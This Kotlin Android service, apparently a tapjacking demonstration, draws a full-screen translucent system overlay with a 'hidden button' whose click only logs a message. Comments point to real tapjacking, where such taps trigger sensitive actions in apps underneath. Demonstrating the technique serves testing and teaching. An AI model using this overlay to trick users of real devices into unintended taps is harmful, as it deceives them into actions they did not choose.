package com.example.tapjacker

import android.app.Service
import android.content.Intent
import android.graphics.PixelFormat
import android.os.IBinder
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.widget.Button

class TapjackerService : Service() {

    private lateinit var windowManager: WindowManager
    private lateinit var overlayView: View

    override fun onCreate() {
        super.onCreate()

        // Initialize WindowManager
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        // Inflate the custom layout for the tapjacker overlay
        overlayView = LayoutInflater.from(this).inflate(R.layout.overlay_tapjacker, null)

        // Set layout parameters for the overlay
        val layoutParams = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT, // Width of the overlay
            WindowManager.LayoutParams.MATCH_PARENT, // Height of the overlay
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY, // Type of window
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or // Do not grab focus
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or // Allow touches to pass to underlying apps
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN, // Allow overlay to be full screen
            PixelFormat.TRANSLUCENT // Make the overlay transparent
        )

        layoutParams.gravity = Gravity.TOP or Gravity.START // Position at the top-left corner

        // Add the overlay view to the window
        windowManager.addView(overlayView, layoutParams)

        // Setup a button to trigger hidden functionality
        val hiddenButton: Button = overlayView.findViewById(R.id.hidden_button)
        hiddenButton.setOnClickListener {
            // Simulate tap action — in real tapjacking, this might trigger sensitive app actions
            // Here, you can log the tap action to ensure the button works as expected
            logTapAction()
        }
    }

    private fun logTapAction() {
        // Log action to detect if the tap works
        android.util.Log.d("TapjackerService", "Hidden button tapped!")
    }

    override fun onDestroy() {
        super.onDestroy()
        if (::overlayView.isInitialized) {
            windowManager.removeView(overlayView)
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        // We don't need to bind this service, so return null
        return null
    }
}
